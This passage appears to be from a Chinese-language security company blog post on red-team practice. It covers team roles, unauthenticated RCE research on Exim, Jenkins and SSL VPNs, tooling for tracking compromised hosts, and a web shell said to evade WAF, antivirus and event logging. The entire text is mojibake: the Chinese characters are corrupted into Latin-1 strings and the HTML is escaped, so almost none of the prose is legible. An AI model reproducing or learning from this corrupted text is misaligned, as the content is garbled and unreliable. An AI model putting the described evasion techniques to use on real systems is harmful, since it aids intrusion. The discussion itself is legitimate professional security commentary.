  &lt;li&gt;Intelligence (åµæŸ¥)ï¼Œè² è²¬æƒ…å ±åµæŸ¥ï¼Œä»–å€‘æœƒå»æ”¶é›†è·Ÿç›®æ¨™æœ‰é—œçš„æ‰€æœ‰è³‡è¨Šï¼ŒåŒ…æ‹¬ IP ç¶²æ®µã€ç¶²ç«™å€‹åˆ¥ä½¿ç”¨çš„æŠ€è¡“ï¼Œç”šè‡³æ˜¯æ´©æ¼çš„å¸³è™Ÿå¯†ç¢¼ã€‚&lt;/li&gt;
  &lt;li&gt;Special Force (ç‰¹æ”»)ï¼Œæœ‰æ¯”è¼ƒå¼·å¤§çš„æ”»æ“Šèƒ½åŠ›ï¼Œä¸»è¦è² è²¬æ‰“ç ´ç¾æ³ï¼Œä¾‹å¦‚æ”»ä¸‹ç¬¬ä¸€å€‹æ“šé»ã€æ‹¿ä¸‹å¦ä¸€å€‹ç¶²æ®µã€æˆ–æ˜¯ä¸»æ©Ÿçš„ææ¬Šã€‚&lt;/li&gt;
  &lt;li&gt;Regular Army (å¸¸è¦)ï¼Œè² è²¬æ‹¿ä¸‹æ“šé»å¾Œæƒè•©æ•´å€‹æˆ°å ´ï¼Œå˜—è©¦æ©«å‘ç§»å‹•ï¼Œæœƒç›¡é‡å¤šå»ºç«‹å¹¾å€‹æ“šé»è®“ç‰¹æ”»çµ„æœ‰æ›´å¤šè³‡æºæœä»»å‹™ç›®æ¨™é‚é€²ã€‚&lt;/li&gt;
  &lt;li&gt;Support (æ”¯æ´)ï¼Œé‡è¦çš„å¾Œå‹¤å·¥ä½œï¼Œç¶­æŒæ“šé»çš„å¯ç”¨æ€§ï¼ŒåŒæ™‚ä¹Ÿè¦è§€å¯Ÿè¨˜éŒ„æ•´å€‹æˆ°æ³ï¼Œæœ€æ¸…æ¥šå…¨å±€æˆ°æ³ã€‚&lt;/li&gt;
  &lt;li&gt;Research (ç ”ç©¶)ï¼Œå¹³æ™‚ç ”ç©¶å„ç¨®åœ¨ç´…éšŠä¸­æœƒç”¨åˆ°çš„æŠ€è¡“ï¼Œæ¼”ç·´æ™‚æœŸç¢°åˆ°å…·æˆ°ç•¥åƒ¹å€¼çš„ç³»çµ±ï¼ŒæœƒæŠ•å…¥è³‡æºé–‹æ¡ 0-dayã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;devcore-ç´…éšŠçš„é€²åŒ–&quot;&gt;DEVCORE ç´…éšŠçš„é€²åŒ–&lt;/h2&gt;

&lt;p&gt;æ‰€è¬‚çš„é€²åŒ–ï¼Œå°±æ˜¯ç¢°åˆ°äº†å•é¡Œï¼Œæƒ³è¾¦æ³•å¼·åŒ–ä¸¦ä¸”è§£æ±ºï¼Œé‚£æˆ‘å€‘é‡åˆ°äº†å“ªäº›å•é¡Œå‘¢ï¼Ÿ&lt;/p&gt;

&lt;h3 id=&quot;å¦‚ä½•æ‰¾åˆ°ä¸€å€‹çªç ´é»&quot;&gt;å¦‚ä½•æ‰¾åˆ°ä¸€å€‹çªç ´é»ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;é€™æ˜¯å¤§å®¶æœ€å¸¸ç¢°åˆ°çš„å•é¡Œï¼Œè¬äº‹èµ·é ­é›£ï¼Œæ€éº¼æ¨£æ‰¾åˆ°ç¬¬ä¸€å€‹çªç ´é»ï¼Ÿé€™å€‹å•é¡Œåœ¨ç´…éšŠæ¼”ç·´ç•¶ä¸­é›£åº¦æœƒæ›´é«˜ï¼Œå› ç‚ºæœ‰è¦æ¨¡çš„ä¼æ¥­æ—©å·²æŠ•å…¥è³‡æºåœ¨è³‡å®‰æª¢æ¸¬å’Œé˜²è­·ä¸Šï¼Œæˆ‘å€‘è¦æ€éº¼æ¨£å¾å±¤å±¤é˜²ç¦¦ç•¶ä¸­æ‰¾åˆ°å¼±é»ï¼Ÿè¦èƒ½æ‰¾åˆ°åˆ¥äººæ‰¾ä¸åˆ°çš„å¼±é»ï¼Œæ¸¬è©¦æ€ç¶­å’Œæ–¹æ³•ä¸€å®šè¦è·Ÿåˆ¥äººä¸ä¸€æ¨£ã€‚æ–¼æ˜¯ï¼Œæˆ‘å€‘æŠ•å…¥è³‡æºåœ¨åµæŸ¥ã€ç‰¹æ”»ã€ç ”ç©¶çµ„ï¼šåµæŸ¥éƒ¨åˆ†ç ”ç©¶äº†ä¸åŒçš„åµæŸ¥æ–¹æ³•å’Œä¾†æºï¼Œä¸¦ä¸”é–‹ç™¼è‡ªå·±çš„å·¥å…·è®“åµæŸ¥æ›´æœ‰æ•ˆç‡ï¼›æˆ‘å€‘çš„ç‰¹æ”»çµ„ä¹Ÿä¸æ–·å¼·åŒ–è‡ªå·±çš„æ”»æ“Šèƒ½åŠ›ï¼›æœ€é‡è¦çš„ï¼Œæˆ‘å€‘è®“ç ”ç©¶äººå“¡é–‹å§‹é‡å°æˆ‘å€‘å¸¸ç¢°åˆ°çš„ç›®æ¨™é€²è¡Œç ”ç©¶ï¼Œé–‹ç™¼ç´…éšŠæœƒç”¨åˆ°çš„å·¥å…·æˆ–æŠ€å·§ã€‚&lt;/p&gt;

&lt;p&gt;é€™é‚Šç‰¹åˆ¥æƒ³è¦åˆ†äº«ç ”ç©¶çµ„çš„æˆæœï¼Œå› ç‚ºæˆ‘å€‘æœƒå»é–‹æ¡ä¸€äº›åŸºç¤è¨­æ–½çš„ 0-dayï¼Œåœ¨è² è²¬ä»»çš„æ­éœ²å¾Œï¼Œæœƒå°‡ 1-day ç”¨æ–¼æ¼”ç·´ä¸­ï¼Œé€™ç¨®æ¨¡å¼å°åœ‹å¤–ç´…éšŠä¾†èªªç®—æ˜¯ç›¸ç•¶å°‘è¦‹ã€‚ç‚ºäº†èƒ½å¹«åŠ©åˆ°ç´…éšŠï¼Œç ”ç©¶çµ„å¹³æ™‚çš„ç ”ç©¶æ–¹å‘ï¼Œé€šå¸¸éƒ½æ˜¯æ‰¾ä¼æ¥­å¤–ç¶²å¯ä»¥ç¢°åˆ°çš„é€šç”¨æœå‹™ï¼Œä¾‹å¦‚éƒµä»¶ä¼ºæœå™¨ã€Jenkinsã€SSL VPNã€‚æˆ‘å€‘æ‰¾çš„å¼±é»éƒ½æ˜¯ä»¥ä¸ç”¨èªè­‰ã€å¯å–å¾—ä¼ºæœå™¨æ§åˆ¶æ¬Šç‚ºå„ªå…ˆï¼Œç›®å‰å·²å…¬é–‹çš„æœ‰ï¼š&lt;a href=&quot;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&quot;&gt;Exim&lt;/a&gt;ã€&lt;a href=&quot;https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;Jenkins&lt;/a&gt;ã€&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Palo Alto GlobalProtect&lt;/a&gt;ã€&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;FortiGate&lt;/a&gt;ã€&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;Pulse Secure&lt;/a&gt;ã€‚é€™äº›æˆæœåœ¨æ¼”ç·´ç•¶ä¸­éƒ½æœ‰éå¸¸éå¸¸é«˜çš„æˆ°ç•¥åƒ¹å€¼ï¼Œç”šè‡³å¯ä»¥èªªæŒæ§äº†é€™äº›ä¼ºæœå™¨å¹¾ä¹å°±èƒ½é–“æ¥æ§åˆ¶ä¼æ¥­çš„å¤§åŠã€‚&lt;/p&gt;

&lt;p&gt;è€Œé€™äº›ç ”ç©¶æˆæœï¼Œä¹Ÿæ„å¤–çš„è¢«åœ‹å¤–æ‰€æ³¨æ„åˆ°ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;PortSwigger é€£çºŒå…©å¹´å¹´åº¦åå¤§ç¶²ç«™æ”»æ“ŠæŠ€è¡“è©•é¸å† è» (&lt;a href=&quot;https://portswigger.net/blog/top-10-web-hacking-techniques-of-2017&quot;&gt;2017&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/blog/top-10-web-hacking-techniques-of-2018&quot;&gt;2018&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;é€£çºŒä¸‰å¹´ DEFCON &amp;amp; Black Hat USA ç™¼è¡¨ (&lt;a href=&quot;https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages&quot;&gt;2017&lt;/a&gt;, &lt;a href=&quot;https://www.blackhat.com/us-18/briefings/schedule/index.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-days-out-10346&quot;&gt;2018&lt;/a&gt;, &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/index.html#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;2019&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;å°ç£ç¬¬ä¸€å€‹æ‹¿åˆ° PWNIE AWARD çé …ï¼šPwnie for Best Server-Side Bug (å¹´åº¦æœ€ä½³ä¼ºæœå™¨æ¼æ´) (&lt;a href=&quot;https://pwnies.com/archive/2018/nominations/&quot;&gt;2018 å…¥åœ&lt;/a&gt;, &lt;a href=&quot;https://pwnies.com/winners/&quot;&gt;2019 å¾—ç&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ç›®æ¨™ä¸Šè¬å°å¦‚ä½•ç™¼æ®ç´…éšŠæ•ˆç›Š&quot;&gt;ç›®æ¨™ä¸Šè¬å°ï¼Œå¦‚ä½•ç™¼æ®ç´…ã€ŒéšŠã€æ•ˆç›Šï¼Ÿ&lt;/h3&gt;

&lt;p&gt;å‰é¢é äº†åµæŸ¥ã€ç‰¹æ”»ã€ç ”ç©¶çµ„çš„æˆæœå–å¾—äº†é€²å…¥é»ã€‚ä¸‹ä¸€å€‹å•é¡Œï¼Œæ˜¯åœ¨æˆ‘å€‘éå»çš„ç¶“é©—ä¸­ï¼Œæœ‰éå¤šæ¬¡æ¼”ç·´çš„ç¯„åœæ˜¯ä¸Šè¬å°é›»è…¦ï¼Œæˆ‘å€‘è¦æ€æ¨£åšæ‰èƒ½ç™¼æ®åœ˜éšŠä½œæˆ°çš„æ•ˆç›Šå‘¢ï¼Ÿæœƒæœ‰é€™å€‹å•é¡Œæ˜¯å› ç‚º&lt;strong&gt;æ•¸é‡ç´š&lt;/strong&gt;ï¼Œå¦‚æœç¯„åœåªæœ‰åå€‹ç¶²ç«™å¾ˆå®¹æ˜“æ‰¾ç›®æ¨™ï¼Œä½†æ˜¯ç•¶ç¶²ç«™è®Šå¤šçš„æ™‚å€™ï¼Œå°±å¾ˆé›£æ¨™è¨»è¨è«–æˆ‘å€‘è¦æ”»æ“Šçš„ç›®æ¨™ã€‚æˆ–æ˜¯ç•¶å¤§å®¶è¦åŒæ­¥é€²åº¦çš„æ™‚å€™ï¼Œæ¯å€‹äººçš„é€²åº¦éƒ½å¾ˆå¤šï¼Œå¾ˆé›£æœ‰å€‹åœ°æ–¹åˆ†äº«ä¼ºæœå™¨è³‡è¨Šï¼Œè®“å…¶ä»–äººèƒ½æ¥çºŒä»»å‹™ã€‚&lt;/p&gt;

&lt;p&gt;éå»æˆ‘å€‘ä½¿ç”¨é¡ä¼¼ Trello çš„ç³»çµ±è¨˜éŒ„æ¯å°ä¼ºæœå™¨çš„ç‹€æ³ï¼Œåœ¨ç¯„åœè¼ƒå°çš„æ™‚å€™å¾ˆæ–¹ä¾¿å¥½ç”¨ï¼Œä½†æ˜¯ç•¶è³‡æ–™é‡ä¸€å¤§å°±æœƒé¡¯å¾—å¾ˆé›£æ“ä½œã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å› æ­¤ï¼Œæˆ‘å€‘è‡ªè¡Œé–‹ç™¼äº†ç³»çµ±å»è§£æ±ºç›¸é—œå•é¡Œã€‚åˆ†äº«ä¸€äº›æˆ‘å€‘è¨­è¨ˆç³»çµ±çš„å¿…è¦åŸå‰‡ä¾›å¤§å®¶åƒè€ƒï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ä¼ºæœå™¨åˆ—è¡¨å¯æ¨™ç±¤ã€æ’åºã€å…¨æ–‡æœå°‹ï¼Œç«åŠ›é›†ä¸­çš„ä¼ºæœå™¨å¿…é ˆè¦è‡ªå‹•åœ¨é¡¯çœ¼è™•ï¼Œçœå»é¡å¤–æœå°‹æ™‚é–“ã€‚&lt;/li&gt;
  &lt;li&gt;è¦å¯è‡ªå‹•å»ºç«‹ä¸»æ©Ÿé—œä¿‚åœ–ï¼Œæ–¹ä¾¿åœ˜éšŠè¨è«–æˆ°æ³ã€‚&lt;/li&gt;
  &lt;li&gt;å„²å­˜çµæ§‹åŒ–è³‡è¨Šè€Œééå»çš„ç´”å­—ä¸²ï¼Œä¾‹å¦‚é€™å°æ©Ÿå™¨é–‹çš„æœå‹™è³‡è¨Šã€æ‹¿ shell çš„æ–¹å¼ã€å·²æ»²é€çš„å¸³è™Ÿå¯†ç¢¼ã€‚æ–¹ä¾¿å¿«é€Ÿé‡æ¸…ç›®å‰é€²åº¦ä»¥åŠäº‹å¾Œåˆ†æã€‚&lt;/li&gt;
  &lt;li&gt;å»ºç«‹ shell ä¸»æ§å°ï¼Œæ–¹ä¾¿æˆå“¡ä¸€éµå–å¾— shell æ“ä½œã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¦å¤–é‚„æœ‰ä¸€å€‹å•é¡Œï¼Œç´…éšŠæˆå“¡é€™éº¼å¤šï¼Œæˆ°å ´åˆåˆ†æ•£ï¼Œå¦‚æœæƒ³è¦æŠŠæˆ‘å€‘åšéçš„æ¸¬è©¦éç¨‹è¨˜éŒ„ä¸‹ä¾†ï¼Œä¸æ˜¯æœƒå¾ˆè¤‡é›œå—ï¼Ÿæ‰€ä»¥æˆ‘å€‘å¦å¤–å¯«äº† plugin è¨˜éŒ„ web çš„æ”»æ“Šæµé‡ã€ä»¥åŠè¨˜éŒ„æˆ‘å€‘åœ¨ shell ä¸‹éçš„æŒ‡ä»¤å’Œä¼ºæœå™¨å›å‚³çš„çµæœï¼Œé€™äº›è¨˜éŒ„ç”šè‡³æ¯”å®¢æˆ¶çš„ access_log å’Œ bash_history é‚„è©³ç´°ã€‚æ­¤å¤–ï¼Œé‡å°æ¯å€‹ç›®æ¨™ä¼ºæœå™¨ï¼Œæˆ‘å€‘ä¹Ÿæœƒç‰¹åˆ¥è¨˜éŒ„åœ¨ä¸Šé¢æ‰€åšéçš„é‡è¦è¡Œç‚ºï¼Œä¾‹å¦‚ï¼šæ”¹äº†ä»€éº¼è¨­å®šï¼Œæ–°å¢æˆ–åˆªé™¤äº†ä»€éº¼æª”æ¡ˆï¼Œæ–¹ä¾¿æˆ‘å€‘é‚„æœ‰å®¢æˆ¶è¿½è¹¤ã€‚è¦åšé€™æ¨£çš„å®¢è£½åŒ–è¨˜éŒ„å…¶å¯¦æ˜¯å¾ˆç¹ç‘£çš„ï¼Œå°é‚£äº›ç¿’æ…£æ–¼è‡ªå‹•åŒ–è§£æ±ºäº‹æƒ…çš„é§­å®¢æ›´æ˜¯ï¼Œä½†æˆ‘å€‘å°±æ˜¯å …æŒåšå¥½é€™æ¨£çš„ç´€éŒ„ï¼Œå³ä½¿å®¢æˆ¶æ²’æœ‰è¦æ±‚ï¼Œæˆ‘å€‘é‚„æ˜¯æœƒè©³å¯¦è¨˜éŒ„æ¯å€‹æ­¥é©Ÿï¼Œä»¥å‚™ä¸æ™‚ä¹‹éœ€ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ä¼æ¥­æœ‰é˜²ç¦¦è¨­å‚™æˆ–æ©Ÿåˆ¶&quot;&gt;ä¼æ¥­æœ‰é˜²ç¦¦è¨­å‚™æˆ–æ©Ÿåˆ¶ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;è§£æ±ºäº†çªç ´é»å’Œå¤šäººåˆä½œçš„å•é¡Œï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘é¢è‡¨åˆ°ç¬¬ä¸‰å€‹å•é¡Œï¼Œä¼æ¥­æœ‰é˜²è­·æªæ–½ï¼åœ¨ç ”è¨æœƒä¸­æˆ‘èˆ‰äº†å¹¾å€‹è¼ƒå®¢è£½çš„çœŸå¯¦é˜²ç¦¦æ¡ˆä¾‹ï¼Œèªªæ˜æˆ‘å€‘é™¤äº†å¸¸è¦‹çš„é˜²ç¦¦è¨­å‚™å¤–ä¹Ÿæ“æœ‰å¾ˆå¤šè·Ÿé˜²ç¦¦æ©Ÿåˆ¶äº¤æ‰‹çš„ç¶“é©—ã€‚æˆ‘å€‘æœƒç ”ç©¶æ¯ç¨®é˜²ç¦¦çš„ç‰¹æ€§åŠ ä»¥ç¹éæˆ–åˆ©ç”¨ï¼Œç”šè‡³æœƒå¯«å·¥å…·å»èº²é¿åµæ¸¬ï¼Œæœ€è¿‘æ¯”è¼ƒç¶“å…¸çš„æ˜¯åœ˜éšŠåšäº†åœ¨ Windows ä¼ºæœå™¨ä¸Šçš„ Web shellï¼Œå®ƒå¯ä»¥åšåˆ° WAF æŠ“ä¸åˆ°ï¼Œé˜²æ¯’è»Ÿé«”æŠ“ä¸åˆ°ï¼Œä¹Ÿä¸æœƒæœ‰ eventlog è¨˜éŒ„ï¼Œåˆ©ç”¨é€™å€‹å·¥å…·å¯ä»¥ç„¡è²ç„¡æ¯æ”¶é›†ä¼ºæœå™¨ä¸Šæˆ‘å€‘éœ€è¦çš„è³‡æ–™ã€‚ç•¶ç„¶ï¼Œæˆ‘å€‘ä¸æ˜¯ç„¡æ•µçš„ï¼Œä¸€äº›è¼ƒåº•å±¤çš„åµæ¸¬æ©Ÿåˆ¶é‚„æ˜¯æœƒç„¡æ³•ç¹éã€‚é€™é‚Šæˆ‘ç›´æ¥è¬›æˆ‘å€‘é€²åŒ–åˆ°ç›®å‰çš„æº–å‰‡ï¼šåœ¨é¢å°ä¼ºæœå™¨é˜²ç¦¦æ©Ÿåˆ¶ï¼Œæˆ‘å€‘èƒ½éš±åŒ¿çš„ï¼Œä¸€å®šåšåˆ°çµ•å°çš„éš±åŒ¿ï¼Œç„¡æ³•èº²çš„ï¼Œå°±æŠŠæµç¨‹æœ€ä½³åŒ–ï¼Œç¸®çŸ­åšäº‹æƒ…çš„æ™‚é–“ï¼Œä¾‹å¦‚æ§åˆ¶åœ¨äº”åˆ†é˜å…§ææ¬Šæ‹¿åˆ°é—œéµè³‡æ–™ï¼Œå°±ç®—è¢«åˆ¥äººæŠ“åˆ°ä¹Ÿæ²’é—œä¿‚ï¼Œå› ç‚ºè©²æ‹¿çš„è³‡æ–™ä¹Ÿæ‹¿åˆ°äº†ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç´…éšŠæˆå“¡æ‡‰å…·å‚™çš„ç‰¹è³ª&quot;&gt;ç´…éšŠæˆå“¡æ‡‰å…·å‚™çš„ç‰¹è³ª&lt;/h2&gt;

&lt;p&gt;è¦èƒ½å¤ åœ¨ç´…éšŠæ¼”ç·´ä¸­æœ‰çªå‡ºæˆæœï¼Œæˆ‘è¦ºå¾—æˆå“¡ç‰¹è³ªæ˜¯æ»¿é—œéµçš„ä¸€å€‹é»ã€‚ä»¥ä¸‹æ•´ç†äº†å¹¾å€‹æˆ‘å¾æˆ‘å€‘ç´…éšŠå¤¥ä¼´è§€å¯Ÿåˆ°çš„ç‰¹è³ªè·Ÿå¤§å®¶åˆ†äº«ï¼Œå¦‚æœå°‡ä¾†æœ‰æ‰“ç®—å¾äº‹ç´…éšŠå·¥ä½œï¼Œæˆ–æ˜¯ä¼æ¥­å·²ç¶“æ‰“ç®—é–‹å§‹æˆç«‹å…§éƒ¨ç´…éšŠï¼Œé€™äº›ç‰¹è³ªå¯èƒ½å¯ä»¥ä½œç‚ºä¸€äº›åƒè€ƒã€‚&lt;/p&gt;

&lt;h3 id=&quot;æƒ³åƒåŠ›&quot;&gt;æƒ³åƒåŠ›&lt;/h3&gt;

&lt;p&gt;ç¬¬ä¸€å€‹æ˜¯æƒ³åƒåŠ›ï¼Œç‚ºä»€éº¼æœƒæé€™å€‹ç‰¹è³ªï¼Œå› ç‚ºç¾åœ¨è³‡å®‰æ„è­˜æ…¢æ…¢å¼·åŒ–ï¼Œè¦é ä¸€æ‹›æ‰“å¤©ä¸‹æ˜¯ä¸å¤ªæœ‰æ©Ÿæœƒçš„ï¼Œå°¤å…¶æ˜¯ç´…éšŠæ¼”ç·´é€™éº¼æœ‰è®ŠåŒ–çš„å·¥ä½œã€‚è¦æœ‰æˆæœä¸€å®šè¦å·§å¦™çš„çµ„åˆåˆ©ç”¨æˆ–æ˜¯ç¹éæ‰æœ‰æ©Ÿæœƒã€‚&lt;/p&gt;

&lt;p&gt;ç›´æ¥èˆ‰å€‹ä¾‹å­ï¼Œæˆ‘å€‘åœ¨å…¬å¸ƒ Pulse Secure VPN çš„&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;ç ”ç©¶ç´°ç¯€&lt;/a&gt;å¾Œï¼Œæœ‰äººåœ¨ twitter ä¸Š&lt;a href=&quot;https://twitter.com/_trou_/status/1168529031177867267&quot;&gt;è¡¨ç¤º&lt;/a&gt;é‚£å€‹é—œéµç”¨ä¾† RCE çš„ argument injection é»ä¹‹å‰ä»–æœ‰æ‰¾åˆ°ï¼Œåªæ˜¯ç„¡æ³•åˆ©ç”¨æ‰€ä»¥å®˜æ–¹ä¹Ÿæ²’æœ‰ä¿®ã€‚ç¢ºå¯¦æˆ‘å€‘æ‰¾åˆ°çš„åœ°æ–¹ç›¸åŒï¼Œä¸éæˆ‘å€‘é æƒ³åƒåŠ›æ‰¾åˆ°äº†ä¸€å€‹å¯åˆ©ç”¨åƒæ•¸ä¸¦æ­é… Perl çš„ç‰¹æ€§ä¸²å‡ºäº† RCEã€‚
å¦ä¸€å€‹ä¾‹å­æ˜¯ &lt;a href=&quot;https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;Jenkins ç ”ç©¶&lt;/a&gt;è£¡é¢çš„ä¸€ç’°ï¼Œæˆ‘å€‘åœ¨ç¹éèº«åˆ†èªè­‰ä¹‹å¾Œç™¼ç¾æœ‰ä¸€å€‹åŠŸèƒ½æ˜¯åœ¨æª¢æŸ¥ä½¿ç”¨è€…è¼¸å…¥çš„ç¨‹å¼èªæ³•æ­£ä¸æ­£ç¢ºã€‚ä¼ºæœå™¨æ€æ¨£å»åˆ¤æ–·èªæ³•æ­£ä¸æ­£ç¢ºï¼Ÿæœ€ç°¡å–®çš„æ–¹æ³•å°±æ˜¯ç›´æ¥å»ç·¨è­¯çœ‹çœ‹ï¼Œå¯ä»¥ç·¨è­¯æˆåŠŸå°±ä»£è¡¨èªæ³•æ­£ç¢ºã€‚æ‰€ä»¥æˆ‘å€‘ç ”ç©¶äº†å¯ä»¥åœ¨ã€ç·¨è­¯éšæ®µã€å‘½ä»¤åŸ·è¡Œçš„æ–¹æ³•ï¼Œè®“ä¼ºæœå™¨åœ¨å˜—è©¦åˆ¤æ–·èªæ³•æ˜¯å¦æ­£ç¢ºçš„åŒæ™‚åŸ·è¡Œæˆ‘å€‘çš„æŒ‡ä»¤ã€‚é€™å€‹æ‰‹æ³•éå»æ²’æœ‰äººæéï¼Œç®—æ˜¯é‹ç”¨æƒ³åƒåŠ›çš„ä¸€å€‹ç¶“å…¸æ¡ˆä¾‹ã€‚&lt;/p&gt;

&lt;p&gt;é—œæ–¼æƒ³åƒåŠ›ï¼Œå…¶å¯¦é‚„æœ‰ä¸€å€‹éš±è—çš„å‰æï¼šåŸºç¤åŠŸè¦å¤ ã€‚æˆ‘ä¸€ç›´èªç‚ºæƒ³åƒåŠ›æ˜¯çŸ¥è­˜çš„æ’åˆ—çµ„åˆï¼Œä¾‹å¦‚å‰›å‰›çš„å…©å€‹ä¾‹å­ï¼Œå¦‚æœä¸çŸ¥é“ Perl èªæ³•ç‰¹æ€§å’Œ Meta-Programming çš„çŸ¥è­˜ï¼Œå†æ€éº¼å¤©é¦¬è¡Œç©ºéƒ½æ˜¯ä¸å¯èƒ½æˆåŠŸ RCE çš„ã€‚æœ‰åŸºç¤åŠŸå†åŠ ä¸Šå‹‡æ–¼è¯æƒ³å’Œå˜—è©¦ï¼Œçµ•å°æ˜¯ä¸€å€‹ç´…éšŠå¤§å°‡çš„å¿…å‚™ç‰¹è³ªã€‚è‡³æ–¼åŸºç¤åŠŸéœ€è¦åˆ°ä»€éº¼ç¨‹åº¦ï¼Œå°æˆ‘å€‘ä¾†èªªï¼Œè¬›åˆ°ä¸€å€‹æ¼æ´ï¼Œå¿ƒä¸­å°±æœƒåŒæ™‚è·³å‡ºä¸€å€‹æ¨¹ç‹€åœ–ï¼šå‡ºç¾æˆå› æ˜¯ä»€éº¼ï¼Ÿç›¸é—œçš„æ¡ˆä¾‹ã€æ¼æ´ã€ç¹éæ–¹å¼éƒ½æœƒå•µå•µå•µè·³å‡ºä¾†ï¼Œèƒ½åšåˆ°é€™æ¨£æˆ‘æƒ³å°±å·²ç¶“æ˜¯æœ‰æ‰€å°æˆäº†ã€‚&lt;/p&gt;

&lt;h3 id=&quot;è¿½æ–°æŠ€è¡“&quot;&gt;è¿½æ–°æŠ€è¡“&lt;/h3&gt;

&lt;p&gt;æœƒè¿½æ–°æŠ€è¡“é€™ä»¶äº‹æƒ…ï¼Œä¼¼ä¹æ˜¯è³‡å®‰åœˆçš„æ¨™é…ï¼Œæˆ‘å€‘çš„ä¸–ç•Œä¸åªæœ‰ OWASP TOP 10ã€‚æ›´ç¾å¯¦çš„èªªæ³•æ˜¯ï¼Œå¦‚æœåªé é€™éº¼ä¸€é»çŸ¥è­˜ï¼Œåœ¨ç´…éšŠæ¼”ç·´èƒ½ç™¼æ®çš„æ•ˆæœå…¶å¯¦ä¸¦ä¸å¤§ã€‚åˆ†äº«ä¸€ä¸‹æˆ‘çœ‹åˆ°æˆå“¡å€‘çš„æ¨£å­ï¼Œå°æ–¼ä»–å€‘ä¾†èªªï¼Œçœ‹æ–°æŠ€è¡“æ˜¯æ¯å¤©çš„ç¿’æ…£ï¼Œå¦‚æœæœ‰è³‡å®‰ç ”è¨æœƒæŠ•å½±ç‰‡é‡‹å‡ºï¼Œæœƒè¿½ã€‚æ–°æŠ€è¡“è£¡æœ‰èˆˆè¶£çš„ï¼Œæœƒå‹•æ‰‹ç©ï¼Œç”šè‡³å¯«æˆå·¥å…·ï¼Œæˆ‘å€‘å¾ˆå¤šå…§éƒ¨å·¥å…·éƒ½æ˜¯é€™æ¨£é»˜é»˜è£œå¼·çš„ã€‚é‚„æœ‰ä¸€é»ï¼Œçœ‹æ–°æŠ€è¡“æœ€çµ‚ç›®çš„å°±æ˜¯è¦æ´»ç”¨ï¼Œæ‹¿æ–°æŠ€è¡“è§£æ±ºèˆŠå•é¡Œï¼Œå¾€å¾€æœ‰æ©Ÿæœƒç™¼ç¾ä¸€äº›çªç ´æ–¹å¼ã€‚ä¾‹å¦‚æˆ‘å€‘åœ¨ä»Šå¹´å…«æœˆ BlackHat ç ”è¨æœƒçœ‹åˆ°äº† &lt;a href=&quot;https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn&quot;&gt;HTTP Desync&lt;/a&gt; çš„æ”»æ“Šæ–¹å¼ï¼Œå›åœ‹ä¹‹å¾Œé¦¬ä¸Šå°±æŠŠé€™å€‹çŸ¥è­˜ç”¨åœ¨ç•¶æ™‚çš„å°ˆæ¡ˆä¸Šï¼Œè®“æˆ‘å€‘å¤šäº†ä¸€äº›æ”»æ“Šé¢å‘ï¼ï¼ˆé€™å€‹æ‰‹æ³•æŒºæœ‰è¶£çš„ï¼Œåœ¨æˆ‘å€‘æ±¡æŸ“ä¼ºæœå™¨å¾Œï¼Œéš¨æ©Ÿä¸€å€‹äººç€è¦½å®¢æˆ¶ç¶²é å°±æœƒåŸ·è¡Œæˆ‘å€‘çš„ JavaScriptï¼Œä¸éœ€è¦ä»€éº¼ç‰¹æ®Šæ¢ä»¶ï¼Œæœ‰èˆˆè¶£å¯ä»¥ç ”ç©¶ä¸€ä¸‹:p ï¼‰&lt;/p&gt;

&lt;h3 id=&quot;ç›¸ä¿¡ä»¥åŠå …æŒ&quot;&gt;ç›¸ä¿¡â€¦ä»¥åŠå …æŒ&lt;/h3&gt;

&lt;p&gt;æœ€å¾Œä¸€é»ï¼Œæˆ‘æƒ³åˆ†äº«çš„æ˜¯ï¼šåœ¨ç ”ç©¶æˆ–è€…æ¸¬è©¦çš„éç¨‹ç•¶ä¸­ï¼Œæœ‰æ™‚å€™æœƒèŠ±è²»å¾ˆå¤šæ™‚é–“å»æ²’æœ‰æˆæœï¼Œä½†æ˜¯å¦‚æœä½ è©•ä¼°æ˜¯æœ‰æ©Ÿæœƒï¼Œé‚£å°±ç›¸ä¿¡è‡ªå·±ï¼ŒèŠ±æ™‚é–“åšä¸‹å»å§ï¼
